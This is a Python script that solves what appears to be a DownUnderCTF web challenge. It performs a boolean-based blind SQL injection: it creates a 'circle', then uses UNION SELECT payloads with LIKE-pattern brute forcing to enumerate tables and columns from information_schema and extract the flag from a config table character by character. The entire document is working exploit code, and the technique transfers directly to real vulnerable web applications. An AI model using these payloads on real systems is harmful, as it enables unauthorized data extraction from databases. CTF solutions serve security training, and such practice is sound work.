#!/usr/bin/python3
import requests
import string

CHARSET = list(string.ascii_lowercase + string.digits) + ['\\_', '-', '{', '}']
CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + ['\\_', '-', '{', '}']

BASE_URL = "https://chal.duc.tf:30103"

query_count = 0
def query(url: str, sql: str, result: list, charset=CHARSET, current=""):
    global query_count
    found = False
    for i in charset:
        r = s.get(url, params={"name": sql.format(current + i + "%")})
        query_count += 1
        if "is not part" not in r.text:
            found = True
            res = query(url, sql, result, charset=charset, current=current + i)
            if not res:
                result.append(current + i)
    return found
            

s = requests.Session()
# create a circle
r = s.post(f"{BASE_URL}/create", data={"name": "lol"})
circle_url = r.url

# find the right table

def get_tables():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type="BASE TABLE" AND table_schema="circlespace" AND table_name LIKE "{}" -- a'
    tables = []
    query(f"{circle_url}/people", q, tables)
    return tables

print(get_tables())

def get_columns():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.columns WHERE table_schema="circlespace" AND table_name="the_cfg" AND column_name LIKE "{}" -- a'
    columns = []
    query(f"{circle_url}/people", q, columns)
    return columns

print(get_columns())

def get_flag():
    q = '" AND 1=0 UNION SELECT 1 FROM the_cfg WHERE cfg_value LIKE BINARY "{}" -- a'
    flags = []
    query(f"{circle_url}/people", q, flags, charset=CHARSET_CASE_SENSITIVE)
    return flags

print(get_flag())
print(f'Completed in {query_count} queries')
